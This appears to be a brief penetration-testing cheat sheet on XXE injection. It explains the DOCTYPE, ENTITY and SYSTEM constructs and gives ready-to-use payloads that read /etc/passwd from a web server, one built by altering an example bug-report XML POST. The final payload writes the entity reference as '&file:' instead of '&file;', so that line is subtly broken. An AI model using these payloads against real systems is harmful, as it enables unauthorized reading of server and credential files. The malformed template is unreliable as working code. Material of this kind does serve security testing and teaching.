# XXE Payloads

When you notice XML in the website or through the HTTP headers, we should see if we can get some XXE.

### Example

If you have an XML POST that looks like this.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>we</title>
                <cwe>we</cwe>
                <cvss>we</cvss>
                <reward>we</reward>
                </bugreport>                                                                                        
```

For a file read injection we can change it to look something like this. `!DOCTYPE` - declares a set of rules about what can appear in the xml. `!ENTITY` - is similar to defining a variable that you can call on later in the file. `SYSTEM` - tells the XML parser to retrieve the entity from an external source allowing for XXE.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>test</title>
 <cwe>test</cwe>
 <cvss>test</cvss>
 <reward>&file;</reward>
</bugreport>
```

This will attempt to read the `/etc/passwd` file AS the webserver.

### Basic File Read

Basic file read looks like this.

```xml
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<any>
<title>test</title>
  <textoutput>&file:</textoutput>
</any>
```
